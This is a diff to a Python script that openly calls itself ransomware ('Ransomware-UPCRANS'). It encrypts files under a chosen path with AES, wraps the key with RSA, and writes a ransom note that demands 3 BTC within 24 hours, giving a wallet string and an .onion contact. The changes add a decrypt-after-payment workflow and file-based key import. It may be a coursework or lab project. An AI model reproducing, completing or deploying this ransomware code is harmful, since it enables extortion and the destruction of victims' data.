@@ -25,14 +25,17 @@ if sys.version_info >= (3, 8, 0):
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
-    parser.add_argument('-p', '--path', help='Path to start attack. Default path = %%HOME%%/', action="store")
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Encrypt files',
+    group.add_argument('--encrypt', help='Encrypt files',
                         action='store_true')
-    group.add_argument('-d', '--decrypt', help='Decrypt files',
+    group.add_argument('--decrypt', help='Decrypt files',
                         action='store_true')
 
+    parser.add_argument('--path', help='Path to start attack', action="store", required = '--encrypt' in sys.argv) 
+    parser.add_argument('--AESkey', help='Path of the key', action="store", required='--decrypt' in sys.argv) 
+    parser.add_argument('--RSAkey', help='Path of the key', action="store", required='--decrypt' in sys.argv)
+    
     return parser.parse_args()
 
 
@@ -53,6 +56,10 @@ def create_Readme():
     If you want to recover all your data, you have 24 hours to pay 3 BTC in the following wallet:
     aweuioxjvsjdñroj3084u
 
+    When you pay and receive the private key, you have to save it in a file and execute the following command:
+    python upcrans.py --decrypt --AESkey KEY.txt --RSAkey KEYRSA.txt
+
+
     In addition, you can talk with us in this chat: xxxxxxxxxx.onion
 
     With our deepest regret,
@@ -72,7 +79,7 @@ def initialize_keys():
     bbdd.sql_insert(data)
 
     #Store AES key encrypted in system
-    with open('fileKey' + ".upcrans", 'wb') as fo:
+    with open('KEY.txt', 'wb') as fo:
                 key_encrypted = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
                 fo.write(key_encrypted)
     return keys
@@ -86,12 +93,24 @@ def encrypt_key(AESkey, key):
     return encrypted_key
 
 
+#Import key from the "path"
+def importKey(path):
+    with open(path, 'rb') as fo:
+            res = fo.read()
+    return res
+
+
 # Decrypt KEY (AES) with private key (RSA).
-def decrypt_key(AESkey, key):
-    private_key = RSA.importKey(key)
+def decrypt_key(AESpath, RSApath):
+    #Import keys from files
+    AESkeyEnc = importKey(AESpath)
+    RSAkey = importKey(RSApath)
+
+    #Decrypt key 
+    private_key = RSA.importKey(RSAkey)
     decryptor = PKCS1_OAEP.new(private_key)
-    decrypted_key = decryptor.decrypt(AESkey)
-    return decrypted_key
+    AESkey = decryptor.decrypt(AESkeyEnc)
+    return AESkey
 
 
 # List files of a system
@@ -193,25 +212,18 @@ def decrypt_file(l_files, key):
 def main(): 
     args = parse_args()
     l_files = list_files(args)
-    keys = initialize_keys()
 
-    if args.encryption == True:
+    if args.encrypt == True:
         #Encrypt files of your system
+        keys = initialize_keys()
         encrypt_file(l_files, keys.AESkey)
         create_Readme()
 
-    elif args.decryption == True:
+    elif args.decrypt == True:
         #Decrypt the encrypted files of your system
-        decrypt_file(l_files, keys.AESkey)
-
-    #elif option == 3:
-        #Validate that encrypt and decrypt keys is working
-    #    enc = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
-    #    dec = decrypt_key(enc, keys.PRIVATE_RSAKEY)
-    #    print(dec==keys.AESkey)
-
-    else:
-        print("No option selected")   
+        AESkey = decrypt_key(args.AESkey, args.RSAkey)
+        decrypt_file(l_files, AESkey)
+   
 
 if __name__ == "__main__":
     main()
